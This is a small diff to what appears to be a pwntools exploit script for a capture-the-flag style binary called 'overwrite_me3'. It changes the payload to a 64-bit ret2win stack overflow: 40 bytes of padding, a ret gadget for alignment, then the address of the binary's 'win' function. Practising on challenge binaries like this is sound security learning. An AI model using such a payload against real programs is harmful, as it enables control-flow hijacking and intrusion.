@@ -11,11 +11,13 @@ def conn():
 
 def main():
     r = conn()
+    exe = ELF("./overwrite_me3")
+    rop = ROP(exe)
 
-    buffer = "A"*56
-    value = "\xde\x11\x40\x00"
-    align = "A"*4
-    payload = buffer + value + align
+    buffer = b"A"*40
+    ret = rop.ret[0]
+    value = exe.sym['win']
+    payload = buffer + p64(ret) + p64(value)
 
     r.recvuntil(b"1-10:")
     r.sendline(payload)
